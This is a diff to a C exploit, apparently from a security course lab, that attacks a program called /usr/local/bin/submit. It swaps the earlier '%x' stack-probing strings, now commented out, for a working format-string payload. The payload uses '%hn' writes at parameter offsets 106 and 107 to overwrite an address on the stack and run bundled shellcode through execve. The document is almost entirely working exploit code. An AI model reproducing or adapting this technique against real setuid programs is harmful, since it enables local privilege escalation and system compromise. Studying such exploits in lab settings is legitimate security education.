@@ -5,17 +5,48 @@
 #include "shellcode.h"
 
 #define TARGET "/usr/local/bin/submit"
-#define ADDRESS "\x03\xde\xbf\xff"
 
 int main(void)
 {
-  char *args[4];
+  char *args[] = { "",
+
+                   "\x0e\xde\xbf\xff\x0c\xde\xbf\xff "
+                   "%106$ 57263x"
+                   "%107$hn"
+                   "%107$ 8199x"
+                   "%106$hn ",
+
+                   shellcode,
+                   NULL };
+
   char *env[] = { NULL };
 
-  args[0] = shellcode;
-  args[1] = "ABCD %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x ";
+  /*
+  args[1] = "DDDD..%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
+          "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x ";
+
+
+  //args[1] = "DDDD%107$x";
+
+
+  // ffbfdfb8 : 0x895e1feb (shellcode)
+
   args[2] = shellcode;
   args[3] = NULL;
+  */
 
   if (execve(TARGET, args, env) < 0)
     fprintf(stderr, "execve failed.\n");
